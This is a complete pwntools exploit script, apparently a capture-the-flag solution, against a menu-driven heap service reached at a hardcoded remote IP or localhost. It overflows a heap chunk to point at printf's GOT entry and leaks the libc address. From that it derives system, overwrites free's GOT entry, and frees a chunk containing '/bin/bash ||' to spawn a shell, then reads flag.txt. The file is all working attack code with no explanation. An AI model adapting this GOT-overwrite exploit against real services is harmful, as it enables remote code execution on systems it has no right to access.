from pwn import *
import struct
import sys

#printf = 0x804a010
printf = 0x804b00c
free = 0x804b010
ip = '127.0.0.1' if len(sys.argv) >= 2 and sys.argv[1] == 'local' else '78.46.224.83'


s = remote(ip, 1456)

def p32(v):
    return struct.pack('<I', v)

def u32(v):
    return struct.unpack('<I', v)[0]


def rm():
    s.recvuntil('Action: ')


def au(sz, desc_sz, desc):
    s.sendline('0')
    s.recvuntil('description: ')
    s.sendline(str(sz))
    s.recvuntil('name: ')
    s.sendline('AAAA')
    s.recvuntil('text length: ')
    s.sendline(str(desc_sz))
    s.recvuntil('text: ')
    s.sendline(desc)

def du(i):
    s.sendline('1')
    s.recvuntil('index: ')
    s.sendline(str(i))

def pu(i):
    s.sendline('2')
    s.recvuntil('index: ')
    s.sendline(str(i))
    s.recvuntil('description: ')
    leak = u32(s.recvline()[:4])
    log.info('leaked printf %s' % hex(leak))
    return leak

def uu(i, sz, desc):
    s.sendline('3')
    s.recvuntil('index: ')
    s.sendline(str(i))
    s.recvuntil('text length: ')
    s.sendline(str(sz))
    s.recvuntil('text: ')
    s.sendline(desc)

rm()
au(0x80, 10, 'A'*10)
au(0x80, 10, 'A'*10)
du(0)
au(0x10c, 0x19d, 'A'*0x198 + p32(printf))
libcleak = pu(1)
system = libcleak - 0xe870
log.info('leaked system %s' % hex(system))
uu(2, 0x19d, '/bin/bash ||' + 'A'*(0x198 - 12) + p32(free))
uu(1, 0x4, p32(system))
du(2)
s.sendline('cat flag.txt')
print s.recv(1000)
